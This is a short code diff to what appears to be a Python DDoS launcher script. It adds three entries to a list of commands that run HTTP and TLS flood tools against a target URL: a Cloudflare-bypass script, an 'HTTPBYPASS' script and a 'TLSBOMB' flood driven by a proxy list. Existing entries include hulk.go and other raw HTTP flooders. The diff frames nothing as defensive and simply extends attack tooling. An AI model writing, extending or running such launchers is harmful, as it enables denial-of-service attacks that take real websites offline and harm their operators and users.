@@ -277,6 +277,9 @@ def main():
                   f'node https1 {url} 10 2000 {time}',
                   f'go run hulk.go -site {url} GET',
                   f'node HTTP-RAW.js {url} {time}',
+                  f'node CFBypass.js {url} {time}',
+                  f'node HTTPBYPASS.js {url} {time}',
+                  f'node TLSBOMB.js {url} proxies.txt {90000}',
                   f'node cfb.js {url} 120'
 ]
 
